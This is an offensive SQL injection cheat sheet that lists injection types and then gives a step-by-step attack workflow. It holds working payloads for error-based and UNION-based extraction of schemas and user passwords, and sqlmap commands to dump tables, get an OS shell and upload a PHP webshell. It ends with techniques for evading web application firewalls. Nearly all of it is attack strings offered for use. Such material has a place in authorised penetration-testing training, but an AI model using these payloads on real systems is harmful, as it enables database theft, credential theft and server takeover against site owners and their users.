SQL INJECTION — Complete Guide:

Types:
  - Error-based: Extract data through database error messages
  - Union-based: Stack UNION SELECT to retrieve data alongside legitimate query
  - Blind boolean: Infer data based on true/false condition differences
  - Blind time-based: Infer data based on query execution time
  - Out-of-band: Exfiltrate data via DNS or HTTP to external server
  - Second-order: Injection payload stored and triggered later

STEP-BY-STEP: Manual SQL Injection Testing

Step 1 — Identify injection points
  1a. Add single quote ' to parameters and observe errors
  1b. Add OR 1=1-- and observe behavior change
  1c. Add time delay: SLEEP(5) or WAITFOR DELAY '0:0:5'
  1d. Try in all parameters: GET, POST, cookies, headers (User-Agent, X-Forwarded-For, Referer)

Step 2 — Confirm injection and determine database type
  2a. MySQL:    ' OR 1=1-- 
  2b. MSSQL:    ' OR 1=1--
  2c. Oracle:   ' OR 1=1--
  2d. Postgres: ' OR 1=1--
  2e. Error-based MySQL: ' AND extractvalue(1,concat(0x7e,version()))--
  2f. Error-based MSSQL: ' AND 1=CONVERT(INT,'a')--
  2g. Check version: ' UNION SELECT @@version--

Step 3 — Union-based extraction
  3a. Find number of columns: ' ORDER BY 1--  (increment until error)
  3b. Find string columns: ' UNION SELECT NULL,NULL,NULL-- (replace NULL with 'a' to find strings)
  3c. Extract database names: ' UNION SELECT schema_name,NULL FROM information_schema.schemata--
  3d. Extract tables: ' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--
  3e. Extract columns: ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
  3f. Extract data: ' UNION SELECT username,password FROM users--

Step 4 — Automated with SQLmap
  4a. Basic: sqlmap -u "http://target.com/page?id=1" --dbs
  4b. POST request: sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs
  4c. Cookie injection: sqlmap -u "http://target.com/" --cookie="session=xyz" --dbs
  4d. Full automation: sqlmap -u "http://target.com/page?id=1" --dbs --tables --dump -D target_db -T users
  4e. Bypass WAF: sqlmap -u "url" --tamper=space2comment,charencode,between --random-agent
  4f. OS access: sqlmap -u "url" --os-shell (if FILE privilege available)
  4g. Upload webshell: sqlmap -u "url" --file-write=/path/to/shell.php --file-dest=/var/www/html/shell.php

Step 5 — WAF Evasion
  5a. Case variation: SeLeCt instead of SELECT
  5b. Comment insertion: SE/**/LECT
  5c. URL encoding: %27 for ', %20 for space
  5d. Double URL encoding: %2527 for '
  5e. Use HEX: 0x61646d696e instead of 'admin'
  5f. Alternative syntaxes: || for concat in Oracle, + for concat in MSSQL
  5g. Scientific notation: 1e0 instead of 1
  5h. Buffer overflow filter: very long padding before payload
